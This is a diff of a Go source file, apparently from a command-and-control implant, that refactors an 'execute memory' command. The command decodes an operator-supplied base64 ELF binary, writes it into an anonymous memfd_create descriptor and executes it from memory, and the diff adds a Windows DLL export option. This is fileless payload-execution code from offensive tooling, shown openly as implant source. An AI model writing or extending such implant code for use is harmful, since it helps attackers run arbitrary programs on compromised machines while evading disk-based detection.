@@ -27,61 +27,38 @@ func (c *ExecuteMemoryCommand) Description() string {
 }
 
 type executeMemoryArgs struct {
-	BinaryB64 string `json:"binary_b64"` // base64-encoded ELF binary
-	Arguments string `json:"arguments"`  // command-line arguments (space-separated)
-	Timeout   int    `json:"timeout"`    // execution timeout in seconds (default: 60)
+	BinaryB64  string `json:"binary_b64"`  // base64-encoded ELF binary
+	Arguments  string `json:"arguments"`   // command-line arguments (space-separated)
+	Timeout    int    `json:"timeout"`     // execution timeout in seconds (default: 60)
+	ExportName string `json:"export_name"` // (Windows only) export function to call for DLLs
 }
 
 func (c *ExecuteMemoryCommand) Execute(task structs.Task) structs.CommandResult {
 	if task.Params == "" {
-		return structs.CommandResult{
-			Output:    "Error: binary_b64 parameter required (base64-encoded ELF binary)",
-			Status:    "error",
-			Completed: true,
-		}
+		return errorResult("Error: binary_b64 parameter required (base64-encoded ELF binary)")
 	}
 
 	var args executeMemoryArgs
 	if err := json.Unmarshal([]byte(task.Params), &args); err != nil {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Error parsing parameters: %v", err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Error parsing parameters: %v", err)
 	}
 
 	if args.BinaryB64 == "" {
-		return structs.CommandResult{
-			Output:    "Error: binary_b64 is empty",
-			Status:    "error",
-			Completed: true,
-		}
+		return errorResult("Error: binary_b64 is empty")
 	}
 
 	binaryData, err := base64.StdEncoding.DecodeString(args.BinaryB64)
 	if err != nil {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Error decoding binary: %v", err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Error decoding binary: %v", err)
 	}
 
 	if len(binaryData) < 4 {
-		return structs.CommandResult{
-			Output:    "Error: binary data too small to be valid",
-			Status:    "error",
-			Completed: true,
-		}
+		return errorResult("Error: binary data too small to be valid")
 	}
 
 	// Validate ELF magic bytes
 	if binaryData[0] != 0x7f || binaryData[1] != 'E' || binaryData[2] != 'L' || binaryData[3] != 'F' {
-		return structs.CommandResult{
-			Output:    "Error: not a valid ELF binary (missing magic header)",
-			Status:    "error",
-			Completed: true,
-		}
+		return errorResult("Error: not a valid ELF binary (missing magic header)")
 	}
 
 	timeout := args.Timeout
@@ -92,11 +69,7 @@ func (c *ExecuteMemoryCommand) Execute(task structs.Task) structs.CommandResult 
 	// Create anonymous memory file descriptor
 	fd, err := unix.MemfdCreate("", 0)
 	if err != nil {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Error: memfd_create failed: %v", err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Error: memfd_create failed: %v", err)
 	}
 
 	file := os.NewFile(uintptr(fd), "memfd")
@@ -104,11 +77,7 @@ func (c *ExecuteMemoryCommand) Execute(task structs.Task) structs.CommandResult 
 
 	// Write ELF binary to memfd
 	if _, err := file.Write(binaryData); err != nil {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Error writing binary to memfd: %v", err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Error writing binary to memfd: %v", err)
 	}
 
 	// Build execution path using the parent process PID.
@@ -155,11 +124,7 @@ func (c *ExecuteMemoryCommand) Execute(task structs.Task) structs.CommandResult 
 		if output == "" {
 			output = fmt.Sprintf("Error executing binary: %v", execErr)
 		}
-		return structs.CommandResult{
-			Output:    output,
-			Status:    "error",
-			Completed: true,
-		}
+		return errorResult(output)
 	}
 
 	output := sb.String()
@@ -167,9 +132,5 @@ func (c *ExecuteMemoryCommand) Execute(task structs.Task) structs.CommandResult 
 		output = fmt.Sprintf("[+] Binary executed successfully (%d bytes, no output)", len(binaryData))
 	}
 
-	return structs.CommandResult{
-		Output:    output,
-		Status:    "success",
-		Completed: true,
-	}
+	return successResult(output)
 }
